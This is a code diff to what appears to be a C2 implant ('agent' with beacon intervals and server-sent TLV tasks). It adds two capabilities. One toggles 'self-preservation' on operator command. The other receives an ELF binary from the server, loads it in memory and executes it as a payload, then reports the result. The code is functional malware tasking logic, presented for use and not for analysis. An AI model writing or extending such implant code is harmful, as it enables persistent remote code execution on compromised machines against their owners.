@@ -13,9 +13,15 @@
 #include "config.h"
 #include "pal.h"
 
+#ifdef __linux__
+#include "elf_loader.h"
+#endif
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+
+#include "compat.h"
 
 /* ---- Dispatcher ------------------------------------------------------- */
 
@@ -63,6 +69,12 @@ int capability_dispatch(agent_ctx_t *ctx,
 
     case TASK_SLEEP:
         return cap_sleep(ctx, fields, field_count, result);
+
+    case TASK_SELFPRESERVE:
+        return cap_selfpreserve(ctx, fields, field_count, result);
+
+    case TASK_LOAD_ELF:
+        return cap_load_elf(ctx, fields, field_count, result);
 
     default:
         fprintf(stderr, "[cap] Unknown task type: 0x%04x\n", task_type);
@@ -279,4 +291,114 @@ int cap_sleep(agent_ctx_t *ctx,
     tlv_buffer_add_u32(result, TLV_BEACON_INTERVAL, new_interval);
 
     return 0;
+}
+
+/* ---- cap_selfpreserve: toggle self-preservation on/off ---------------- */
+
+int cap_selfpreserve(agent_ctx_t *ctx,
+                     const tlv_field_t *fields, size_t field_count,
+                     tlv_buffer_t *result)
+{
+    if (ctx == NULL) {
+        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
+        return -1;
+    }
+
+    /* Read the toggle value from TLV_TASK_DATA.
+     * Expected payload: a single uint8 — 0x01 = enable, 0x00 = disable.
+     * If no payload is provided, default to enable. */
+    const tlv_field_t *data_field = tlv_find_field(fields, field_count,
+                                                    TLV_TASK_DATA);
+
+    int enable = 1; /* Default: enable */
+    if (data_field != NULL && data_field->length >= 1) {
+        enable = (data_field->value[0] != 0) ? 1 : 0;
+    }
+
+    int rc;
+    if (enable) {
+        rc = pal_self_preserve_start();
+        ctx->self_preserve = 1;
+    } else {
+        rc = pal_self_preserve_stop();
+        ctx->self_preserve = 0;
+    }
+
+    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, (rc == 0) ? 0 : 1);
+    tlv_buffer_add_str(result, TLV_RESULT_DATA,
+                       enable ? "self-preservation enabled"
+                              : "self-preservation disabled");
+
+    pal_log("Self-preservation %s by operator (rc=%d).",
+            enable ? "ENABLED" : "DISABLED", rc);
+
+    return rc;
+}
+
+/* ---- cap_load_elf: load & execute ELF from server --------------------- */
+
+int cap_load_elf(agent_ctx_t *ctx,
+                 const tlv_field_t *fields, size_t field_count,
+                 tlv_buffer_t *result)
+{
+    (void)ctx;
+
+#ifndef __linux__
+    /* ELF loading is Linux-only */
+    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
+    tlv_buffer_add_str(result, TLV_RESULT_DATA,
+                       "ELF loader not available on this platform");
+    return -1;
+#else
+    const tlv_field_t *data_field = tlv_find_field(fields, field_count,
+                                                    TLV_TASK_DATA);
+    if (data_field == NULL || data_field->length == 0) {
+        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
+        tlv_buffer_add_str(result, TLV_RESULT_DATA,
+                           "no ELF binary provided");
+        return -1;
+    }
+
+    pal_log("Loading ELF binary (%u bytes)...", data_field->length);
+
+    /* Validate the ELF binary */
+    if (elf_validate(data_field->value, data_field->length) != 0) {
+        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
+        tlv_buffer_add_str(result, TLV_RESULT_DATA,
+                           "invalid ELF binary");
+        return -1;
+    }
+
+    /* Load the ELF into memory */
+    elf_ctx_t elf;
+    if (elf_load(data_field->value, data_field->length, &elf) != 0) {
+        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
+        tlv_buffer_add_str(result, TLV_RESULT_DATA,
+                           "ELF load failed");
+        return -1;
+    }
+
+    /* Execute the loaded ELF.
+     * We pass empty argc/argv since the ELF is a server-delivered
+     * payload, not a command-line program. */
+    char *argv[] = { (char *)"payload", NULL };
+    char *envp[] = { NULL };
+
+    int rc = elf_execute(&elf, 1, argv, envp);
+
+    pal_log("ELF execution returned %d", rc);
+
+    /* Unload the ELF */
+    elf_unload(&elf);
+
+    /* Report result */
+    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, (rc == 0) ? 0 : 1);
+
+    char result_msg[128];
+    snprintf(result_msg, sizeof(result_msg),
+             "ELF executed (exit=%d)", rc);
+    tlv_buffer_add_str(result, TLV_RESULT_DATA, result_msg);
+
+    return 0;
+#endif /* __linux__ */
 }
